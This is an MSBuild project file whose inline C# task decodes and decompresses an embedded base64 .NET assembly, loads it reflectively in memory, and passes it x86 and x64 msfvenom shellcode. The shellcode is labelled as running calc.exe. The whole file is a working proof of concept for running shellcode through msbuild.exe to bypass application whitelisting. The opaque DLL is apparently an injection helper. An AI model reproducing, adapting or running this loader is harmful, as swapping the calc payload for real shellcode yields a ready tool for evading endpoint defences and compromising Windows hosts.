<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Sample"><Sample /></Target>
  <UsingTask
    TaskName="Sample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task><Code Type="Class" Language="cs"><![CDATA[

using System;
using System.Reflection;
using System.IO;
using System.IO.Compression;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;


public class Sample : Microsoft.Build.Utilities.Task, Microsoft.Build.Framework.ITask {

    private static string encoded_compressed_dll = @"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";
                
    // msfvenom -p windows/exec CMD=calc.exe -f raw | base64
    private static String x86_shellcode = @"
        /OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjj
        SAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sE
        iwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu/C1olZoppW9nf/VPAZ8CoD7
        4HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==";

    // msfvenom -p windows/x64/exec CMD=calc.exe -f raw | base64
    private static String x64_shellcode = @"
        /EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
        yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
        TTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFY
        QVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//V
        u/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";

    private static byte[] decode_decompress_dll(string ecdll)
    {
        byte[] compressed_dll = System.Convert.FromBase64String(ecdll);
        System.IO.MemoryStream memstream = new System.IO.MemoryStream(compressed_dll.Length);
        System.IO.MemoryStream msptr = new System.IO.MemoryStream();
        memstream.Write(compressed_dll, 0, compressed_dll.Length);
        memstream.Seek(0, System.IO.SeekOrigin.Begin);
        using (System.IO.Compression.DeflateStream deflator =
            new System.IO.Compression.DeflateStream(
                memstream,
                System.IO.Compression.CompressionMode.Decompress
            )
        )
        {
            byte[] block = new byte[4096];
            int nbytes;
            while ((nbytes = deflator.Read(block, 0, block.Length)) != 0)
                msptr.Write(block, 0, nbytes);
        }
        return msptr.ToArray();
    }

    public override bool Execute()
    {
        System.Reflection.Assembly loaded_assembly = System.Reflection.Assembly.Load(
            decode_decompress_dll(encoded_compressed_dll)
        );
        System.Type astype = loaded_assembly.GetType("Example2");
        object class_instance = System.Activator.CreateInstance(astype, null);
        System.Reflection.MethodInfo entrypoint = astype.GetMethod("Run");
        entrypoint.Invoke(class_instance, new object[] { x86_shellcode, x64_shellcode });
        return true;
    }
}

      ]]></Code>
    </Task>
  </UsingTask>
</Project>

